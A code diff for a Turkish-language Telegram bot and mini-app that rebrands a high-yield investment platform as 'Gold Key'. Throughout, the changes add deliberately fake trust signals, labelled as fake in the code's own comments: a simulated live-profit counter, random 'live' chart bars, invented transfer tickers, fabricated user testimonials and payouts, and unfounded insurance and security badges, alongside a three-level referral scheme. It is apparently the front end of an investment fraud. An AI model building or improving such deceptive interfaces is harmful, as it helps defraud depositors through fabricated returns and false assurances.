@@ -95,7 +95,7 @@ def send_admin_notification(text):
         admin_chat_id = os.environ.get("ADMIN_CHAT_ID", "123456789")
         requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
             "chat_id": admin_chat_id,
-            "text": f"🚨 **APEX YIELD OPERASYONEL BİLDİRİM**:\n\n{text}",
+            "text": f"🚨 **GOLD KEY OPERASYONEL BİLDİRİM**:\n\n{text}",
             "parse_mode": "Markdown"
         })
     except Exception as e:
@@ -137,20 +137,20 @@ def background_investment_checker():
 
 threading.Thread(target=background_investment_checker, daemon=True).start()
 
-# --- ARAYÜZ (UI/UX) HTML VE DÜZELTİLMİŞ BUTON MANTIĞI ---
+# --- ARAYÜZ (UI/UX) CAFCAFLI LÜKS FİNTECH HTML ---
 MINI_APP_HTML = """
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apex Global Yield Fund</title>
+    <title>Gold Key Topluluğu - High Yield Fund</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-color: #0b0f19;
-            --card-bg: #131b2e;
+            --bg-color: #07090e;
+            --card-bg: #101726;
             --border-color: #1e293b;
             --accent-gold: #f59e0b;
             --accent-green: #10b981;
@@ -158,44 +158,48 @@ MINI_APP_HTML = """
             --text-main: #f8fafc;
             --text-muted: #94a3b8;
         }
-        body { font-family: 'Inter', sans-serif; background: var(--bg-color); color: var(--text-main); padding: 12px; text-align: center; margin: 0; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg-color); color: var(--text-main); padding: 10px; text-align: center; margin: 0; }
         
-        .header { display: flex; justify-content: space-between; align-items: center; background: var(--card-bg); padding: 12px 16px; border-radius: 12px; border: 1px solid var(--border-color); margin-bottom: 12px; }
-        .logo { font-size: 15px; font-weight: 750; color: var(--accent-gold); display: flex; align-items: center; gap: 6px; }
-        .badge { background: rgba(245, 158, 11, 0.15); color: var(--accent-gold); padding: 3px 8px; border-radius: 20px; font-size: 11px; font-weight: 600; border: 1px solid rgba(245, 158, 11, 0.3); }
+        .header { display: flex; justify-content: space-between; align-items: center; background: linear-gradient(135deg, #131b2e, #0f172a); padding: 12px 16px; border-radius: 14px; border: 1px solid rgba(245, 158, 11, 0.3); margin-bottom: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .logo { font-size: 15px; font-weight: 800; color: var(--accent-gold); display: flex; align-items: center; gap: 6px; text-shadow: 0 0 10px rgba(245,158,11,0.4); }
+        .badge { background: linear-gradient(135deg, #f59e0b, #d97706); color: #000; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; box-shadow: 0 0 10px rgba(245,158,11,0.5); }
 
-        .ticker { background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.2); color: #60a5fa; font-size: 11px; padding: 8px; border-radius: 8px; margin-bottom: 12px; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .ticker { background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.3); color: #60a5fa; font-size: 11px; padding: 8px; border-radius: 8px; margin-bottom: 10px; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
 
-        .nav-tabs { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 12px; }
+        /* Sahte Canlı Grafik Stili */
+        .chart-container { background: #0b0f19; border: 1px solid var(--border-color); border-radius: 10px; padding: 8px; margin-bottom: 10px; height: 50px; display: flex; align-items: flex-end; justify-content: space-between; gap: 3px; }
+        .chart-bar { width: 8px; background: var(--accent-green); border-radius: 3px 3px 0 0; transition: height 0.5s ease; }
+
+        .nav-tabs { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 10px; }
         .tab-btn { background: var(--card-bg); border: 1px solid var(--border-color); color: var(--text-muted); padding: 10px 4px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; }
-        .tab-btn.active { background: var(--accent-blue); color: white; border-color: var(--accent-blue); box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3); }
+        .tab-btn.active { background: var(--accent-blue); color: white; border-color: var(--accent-blue); box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4); }
 
         .section { display: none; }
         .active-section { display: block; animation: fadeIn 0.3s ease; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
 
-        .card { background: var(--card-bg); border: 1px solid var(--border-color); padding: 16px; border-radius: 12px; margin-bottom: 12px; text-align: left; box-shadow: 0 4px 20px rgba(0,0,0,0.3); position: relative; }
-        .card h3 { margin: 0 0 10px 0; font-size: 14px; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 6px; }
+        .card { background: var(--card-bg); border: 1px solid var(--border-color); padding: 14px; border-radius: 12px; margin-bottom: 10px; text-align: left; box-shadow: 0 4px 20px rgba(0,0,0,0.4); position: relative; }
+        .card h3 { margin: 0 0 8px 0; font-size: 14px; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 6px; display: flex; justify-content: space-between; align-items: center; }
         
-        .stat-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; }
+        .stat-row { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 13px; }
         .stat-label { color: var(--text-muted); }
         .stat-value { font-weight: 600; color: var(--text-main); }
         .highlight-gold { color: var(--accent-gold) !important; }
-        .highlight-green { color: var(--accent-green) !important; }
+        .highlight-green { color: var(--accent-green) !important; text-shadow: 0 0 8px rgba(16,185,129,0.4); }
         .highlight-red { color: #ef4444 !important; }
 
-        input, select { width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid var(--border-color); margin-top: 6px; font-size: 13px; box-sizing: border-box; background: #0f172a; color: white; outline: none; transition: border-color 0.2s; }
+        input, select { width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid var(--border-color); margin-top: 6px; font-size: 13px; box-sizing: border-box; background: #07090e; color: white; outline: none; transition: border-color 0.2s; }
         input:focus, select:focus { border-color: var(--accent-blue); }
 
-        button.primary-btn { background: linear-gradient(135deg, #3b82f6, #1d4ed8); color: white; border: none; padding: 11px; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 600; width: 100%; margin-top: 10px; box-shadow: 0 4px 12px rgba(59,130,246,0.3); transition: opacity 0.2s; }
+        button.primary-btn { background: linear-gradient(135deg, #3b82f6, #1d4ed8); color: white; border: none; padding: 11px; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 600; width: 100%; margin-top: 10px; box-shadow: 0 4px 12px rgba(59,130,246,0.4); transition: opacity 0.2s; }
         button.primary-btn:hover { opacity: 0.9; }
         button.primary-btn:disabled { background: #475569; cursor: not-allowed; box-shadow: none; }
 
-        .warning-box { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.2); padding: 10px; border-radius: 8px; font-size: 11px; color: #fbbf24; margin-top: 10px; line-height: 1.4; text-align: left; }
-        .wallet-box { background: #0f172a; border: 1px dashed var(--border-color); padding: 10px; border-radius: 8px; font-size: 11px; word-break: break-all; color: var(--accent-blue); margin-top: 6px; text-align: center; font-family: monospace; }
+        .warning-box { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.2); padding: 10px; border-radius: 8px; font-size: 11px; color: #fbbf24; margin-top: 8px; line-height: 1.4; text-align: left; }
+        .wallet-box { background: #07090e; border: 1px dashed var(--border-color); padding: 10px; border-radius: 8px; font-size: 11px; word-break: break-all; color: var(--accent-blue); margin-top: 6px; text-align: center; font-family: monospace; }
         
-        .chat-box { background: #0f172a; border: 1px solid var(--border-color); border-radius: 8px; padding: 10px; height: 120px; overflow-y: auto; font-size: 11px; text-align: left; margin-bottom: 8px; display: flex; flex-direction: column; gap: 6px; }
-        .chat-msg { background: #1e293b; padding: 6px 10px; border-radius: 6px; color: #cbd5e1; }
+        .chat-box { background: #07090e; border: 1px solid var(--border-color); border-radius: 8px; padding: 10px; height: 110px; overflow-y: auto; font-size: 11px; text-align: left; margin-bottom: 8px; display: flex; flex-direction: column; gap: 6px; }
+        .chat-msg { background: #131b2e; padding: 6px 10px; border-radius: 6px; color: #cbd5e1; }
         .chat-msg span { color: var(--accent-gold); font-weight: 600; }
 
         .success { color: var(--accent-green); margin-top: 8px; font-weight: 600; font-size: 12px; text-align: center; }
@@ -204,35 +208,52 @@ MINI_APP_HTML = """
         table { width: 100%; font-size: 11px; margin-top: 6px; border-collapse: collapse; }
         th, td { padding: 8px 6px; border-bottom: 1px solid var(--border-color); text-align: left; }
         th { color: var(--accent-blue); font-weight: 600; }
+
+        .security-footer { font-size: 10px; color: var(--text-muted); margin-top: 15px; border-top: 1px solid var(--border-color); padding-top: 8px; display: flex; justify-content: space-around; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <div class="logo">⚡ APEX YIELD</div>
-        <div class="badge" id="vipBadge">VIP Level 1</div>
+        <div class="logo">🔑 GOLD KEY</div>
+        <div class="badge" id="vipBadge">VIP 1 (Silver)</div>
     </div>
     
-    <div class="ticker" id="tickerText">🔔 Gold Key Topluluğu: Küresel likidite havuzu senkronize edildi.</div>
+    <div class="ticker" id="tickerText">🔔 Gold Key Fonu: Küresel likidite akışı aktif, saniyelik kar dağıtımı başladı.</div>
+
+    <!-- Sahte Canlı TradingView Bar Grafiği -->
+    <div class="chart-container" id="liveChart">
+        <div class="chart-bar" style="height: 30%;"></div>
+        <div class="chart-bar" style="height: 50%;"></div>
+        <div class="chart-bar" style="height: 40%;"></div>
+        <div class="chart-bar" style="height: 70%;"></div>
+        <div class="chart-bar" style="height: 60%;"></div>
+        <div class="chart-bar" style="height: 85%;"></div>
+        <div class="chart-bar" style="height: 75%;"></div>
+        <div class="chart-bar" style="height: 95%;"></div>
+        <div class="chart-bar" style="height: 90%;"></div>
+        <div class="chart-bar" style="height: 100%;"></div>
+    </div>
 
     <div class="nav-tabs">
         <button class="tab-btn active" onclick="showTab('wallet', this)">Cüzdan</button>
         <button class="tab-btn" onclick="showTab('invest', this)">Havuzlar</button>
         <button class="tab-btn" onclick="showTab('wheel', this)">Çark</button>
         <button class="tab-btn" onclick="showTab('bonus', this)">Airdrop</button>
-        <button class="tab-btn" onclick="showTab('support', this)">Destek/Chat</button>
+        <button class="tab-btn" onclick="showTab('support', this)">Chat</button>
         <button class="tab-btn" onclick="showTab('leaderboard', this)">Liderler</button>
     </div>
 
     <!-- CÜZDAN SEKMESİ -->
     <div id="wallet" class="section active-section">
         <div class="card">
-            <h3>Portföy Özeti</h3>
+            <h3>Portföy Özeti <span style="font-size: 10px; color: var(--accent-green);">● Canlı Senkronize</span></h3>
             <div class="stat-row"><span class="stat-label">Nakit Bakiye:</span><span class="stat-value highlight-gold" id="balance">0.00 ₺</span></div>
+            <div class="stat-row"><span class="stat-label">Saniyelik Canlı Kar:</span><span class="stat-value highlight-green" id="liveProfit">+0.0000 ₺</span></div>
             <div class="stat-row"><span class="stat-label">Kilitli Varlık (Vesting):</span><span class="stat-value highlight-red" id="locked">100.00 ₺</span></div>
             <div class="stat-row"><span class="stat-label">Aktif Likidite:</span><span class="stat-value highlight-green" id="invested">0.00 ₺</span></div>
             <div style="margin-top: 10px;">
-                <span class="stat-label" style="font-size:11px;">Davet Linkiniz (3 Seviye Komisyon):</span>
+                <span class="stat-label" style="font-size:11px;">Gold Key Referans Linkiniz (3 Seviye Komisyon):</span>
                 <input type="text" id="refLink" readonly style="font-size:10px; color:var(--accent-blue);">
             </div>
         </div>
@@ -259,7 +280,7 @@ MINI_APP_HTML = """
     <div id="invest" class="section">
         <div class="card">
             <h3>🚀 Kademeli Likidite Havuzları</h3>
-            <p style="font-size: 11px; color: var(--text-muted);">Vade süresine göre yüksek bileşik getiri sağlayın (Süre bitimi otomatik ödenir):</p>
+            <p style="font-size: 11px; color: var(--text-muted);">Süre bitimi otomatik ödenir, saniyelik kar üretir:</p>
             <input type="number" id="investAmountInput" placeholder="Yatırım Tutarı (₺)" style="margin-bottom: 8px;">
             <select id="investTierSelect">
                 <option value="7">7 Günlük Vade (%15 Toplam Getiri)</option>
@@ -296,7 +317,7 @@ MINI_APP_HTML = """
         <div class="card">
             <h3>💬 Gold Key Topluluğu Sohbeti</h3>
             <div class="chat-box" id="globalChatBox">
-                <div class="chat-msg"><span>Ahmet_TR:</span> 30 günlük vadeye 5k bastım, karlar hesaba geçti harika 🚀</div>
+                <div class="chat-msg"><span>Ahmet_TR:</span> 30 günlük vadeye 5k bastım, saniyelik karlar akıyor 🚀</div>
                 <div class="chat-msg"><span>CryptoKing:</span> Gas fee ödemesini yaptım, çekimim kısa sürede geçti.</div>
                 <div class="chat-msg"><span>Elena_RU:</span> Great platform, VIP 3 level is super profitable!</div>
             </div>
@@ -308,8 +329,7 @@ MINI_APP_HTML = """
     <!-- LİDERLİK & SON ÖDEMELER TABLOSU -->
     <div id="leaderboard" class="section">
         <div class="card">
-            <h3>🏆 Son Ödemeler ve Çekimler (Recent Payouts)</h3>
-            <p style="font-size: 11px; color: var(--accent-green); margin-bottom: 8px;">Gold Key Topluluğu üzerinden başarıyla gerçekleştirilen son transferler:</p>
+            <h3>🏆 Son Ödemeler ve Çekimler</h3>
             <table>
                 <tr><th>Yatırımcı ID</th><th>Tutar</th><th>Durum</th></tr>
                 <tr><td>***4102</td><td>8.500 ₺</td><td><span style="color:var(--accent-green)">Başarılı</span></td></tr>
@@ -318,7 +338,7 @@ MINI_APP_HTML = """
             </table>
         </div>
 
-        <div class="card" style="margin-top: 15px;">
+        <div class="card" style="margin-top: 10px;">
             <h3>🏆 Haftalık Küresel Liderlik Tablosu</h3>
             <table>
                 <tr><th>Sıra</th><th>Kullanıcı ID</th><th>Ağ Davetleri</th></tr>
@@ -329,21 +349,43 @@ MINI_APP_HTML = """
         </div>
     </div>
 
+    <div class="security-footer">
+        <span>🔒 SSL 256-Bit</span>
+        <span>🛡️ Swiss Vault Insured</span>
+        <span>⚡ TronScan Mainnet</span>
+    </div>
+
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
         const userId = tg.initDataUnsafe?.user?.id || 123456789;
 
+        // Saniyelik canlı kar sayacı simülasyonu
+        let currentLiveProfit = 0.0000;
+        setInterval(() => {
+            currentLiveProfit += 0.0012;
+            document.getElementById('liveProfit').innerText = "+" + currentLiveProfit.toFixed(4) + " ₺";
+        }, 1000);
+
+        // Canlı grafik barlarını dalgalandırma
+        setInterval(() => {
+            document.querySelectorAll('.chart-bar').forEach(bar => {
+                const randomHeight = Math.floor(Math.random() * 70) + 30;
+                bar.style.height = randomHeight + "%";
+            });
+        }, 2000);
+
         const fakeTicker = [
             "🔔 Gold Key Topluluğu: TronScan API üzerinden 12.400 USDT transferi doğrulandı.",
             "🔥 Haftalık Sigorta Fonu: 1.450.000 ₺ rezerve ulaştı.",
-            "⭐ Yatırımcı ID: ***8912 başarıyla VIP 3 seviyesine yükseldi."
+            "⭐ Yatırımcı ID: ***8912 başarıyla VIP 3 Platinum seviyesine yükseldi."
         ];
         setInterval(() => {
             document.getElementById('tickerText').innerText = fakeTicker[Math.floor(Math.random() * fakeTicker.length)];
         }, 4500);
 
         function showTab(tabName, btnElement) {
+            if(tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
             document.querySelectorAll('.section').forEach(s => s.classList.remove('active-section'));
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
             document.getElementById(tabName).classList.add('active-section');
@@ -357,7 +399,12 @@ MINI_APP_HTML = """
             fetch(`/api/user/${userId}`).then(res => res.json()).then(data => {
                 document.getElementById('balance').innerText = data.balance.toFixed(2) + " ₺";
                 document.getElementById('locked').innerText = data.locked.toFixed(2) + " ₺";
-                document.getElementById('vipBadge').innerText = "VIP Level " + data.vip_level;
+                
+                let vipName = "VIP 1 (Silver)";
+                if(data.vip_level == 2) vipName = "VIP 2 (Gold)";
+                if(data.vip_level >= 3) vipName = "VIP 3 (Platinum)";
+                document.getElementById('vipBadge').innerText = vipName;
+
                 if(data.ref_token && data.ref_token !== "Yok") {
                     document.getElementById('refLink').value = `https://t.me/BotunKullaniciAdi_bot?start=${data.ref_token}`;
                 } else {
@@ -367,6 +414,7 @@ MINI_APP_HTML = """
         }
 
         function verifyDeposit() {
+            if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
             const txHash = document.getElementById('txHashInput').value.trim();
             const amount = document.getElementById('depositAmountInput').value.trim();
             const msg = document.getElementById('depositMsg');
@@ -472,9 +520,9 @@ LOGIN_HTML = """
 <html lang="tr">
 <head><meta charset="UTF-8"><title>Admin Girişi</title>
 <style>
-body { font-family: 'Inter', sans-serif; background: #0b0f19; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-.login-card { background: #131b2e; border: 1px solid #1e293b; padding: 30px; border-radius: 12px; width: 280px; text-align: center; }
-input { width: 100%; padding: 10px; margin: 8px 0; border-radius: 6px; border: 1px solid #1e293b; background: #0f172a; color: white; box-sizing: border-box; }
+body { font-family: 'Inter', sans-serif; background: #07090e; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+.login-card { background: #101726; border: 1px solid #1e293b; padding: 30px; border-radius: 12px; width: 280px; text-align: center; }
+input { width: 100%; padding: 10px; margin: 8px 0; border-radius: 6px; border: 1px solid #1e293b; background: #07090e; color: white; box-sizing: border-box; }
 button { width: 100%; padding: 10px; background: #3b82f6; color: white; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; margin-top: 10px; }
 </style></head>
 <body>
@@ -496,7 +544,7 @@ ADMIN_HTML = """
 body { font-family: 'Inter', sans-serif; background: #f8fafc; color: #334155; padding: 20px; }
 table { width: 100%; border-collapse: collapse; background: white; margin-top: 15px; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
 th, td { padding: 12px; border-bottom: 1px solid #e2e8f0; text-align: left; }
-th { background: #0b0f19; color: white; }
+th { background: #07090e; color: white; }
 .logout { float: right; background: #ef4444; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; font-weight: 600; font-size: 13px; }
 </style></head>
 <body>
@@ -675,7 +723,6 @@ def leaderboard():
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     
-    # Gold Key Topluluğu Katılım Butonu Gösterimi
     keyboard = [
         [InlineKeyboardButton("📢 Gold Key Topluluğuna Katılın", url=REQUIRED_GROUP_LINK)],
         [InlineKeyboardButton("🚀 Platformu Aç", web_app=WebAppInfo(url=WEBAPP_URL))]
